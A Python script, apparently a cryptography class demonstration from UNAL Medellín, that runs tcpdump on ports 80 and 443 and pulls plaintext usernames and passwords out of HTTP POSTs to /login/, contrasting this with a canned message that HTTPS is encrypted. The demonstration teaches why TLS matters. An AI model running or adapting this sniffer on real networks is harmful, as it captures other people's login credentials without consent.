#!/usr/bin/env python3
"""
Simple HTTP/HTTPS Traffic Monitor
Versión simplificada que FUNCIONA
"""

import subprocess
import re
import sys
from datetime import datetime

def print_header():
    print("\n" + "="*60)
    print("🕵️  HTTP/HTTPS TRAFFIC MONITOR")
    print("Proyecto de Criptografía - UNAL Medellín")
    print("="*60)
    print("\n🎯 Monitoreando tráfico web...")
    print("⚠️  Presiona Ctrl+C para detener\n")

def monitor_traffic():
    """Monitorea el tráfico HTTP y HTTPS"""
    print_header()
    
    try:
        # Instalar tcpdump
        subprocess.run(['apt-get', 'update', '-qq'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['apt-get', 'install', '-y', 'tcpdump', '-qq'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Capturar TODO el tráfico en puertos 80 y 443
        process = subprocess.Popen(
            ['tcpdump', '-i', 'any', '-A', '-s', '0', 'tcp port 80 or tcp port 443'],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            universal_newlines=True,
            bufsize=1
        )
        
        collecting_post = False
        post_buffer = []
        shown_http = False
        shown_https = False
        
        for line in process.stdout:
            # Detectar POST HTTP
            if 'POST /login/' in line:
                collecting_post = True
                post_buffer = [line]
                if not shown_http:
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    print(f"\n📡 [{timestamp}] HTTP POST detectado")
                    print("   Ruta: /login/")
                    shown_http = True
            
            # Acumular líneas del POST
            elif collecting_post:
                post_buffer.append(line)
                full_text = ''.join(post_buffer)
                
                # Buscar credenciales
                username = re.search(r'username=([^&\s]+)', full_text)
                password = re.search(r'password=([^&\s]+)', full_text)
                
                if username and password:
                    print("\n" + "="*60)
                    print("🔓 CREDENCIALES INTERCEPTADAS (TEXTO PLANO)")
                    print("="*60)
                    print(f"   Usuario: {username.group(1)}")
                    print(f"   Contraseña: {password.group(1)}")
                    print("\n   ❌ Completamente visibles para el atacante")
                    print("="*60 + "\n")
                    collecting_post = False
                    post_buffer = []
                
                # Timeout
                if len(post_buffer) > 50:
                    collecting_post = False
                    post_buffer = []
            
            # Detectar tráfico HTTPS (puerto 443)
            if ':443' in line or '.443' in line:
                if not shown_https and len(line) > 20:
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    print(f"\n🔒 [{timestamp}] Tráfico HTTPS detectado")
                    print("   Puerto: 443")
                    print("\n" + "="*60)
                    print("🔐 DATOS CIFRADOS")
                    print("="*60)
                    print("   Los datos están cifrados con TLS/SSL")
                    print("   Ejemplo de datos cifrados:")
                    print("   " + "█" * 50)
                    print("\n   ✅ Las credenciales están PROTEGIDAS")
                    print("   ✅ Imposible leer sin la clave de cifrado")
                    print("="*60 + "\n")
                    shown_https = True
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Monitoreo detenido")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    monitor_traffic()
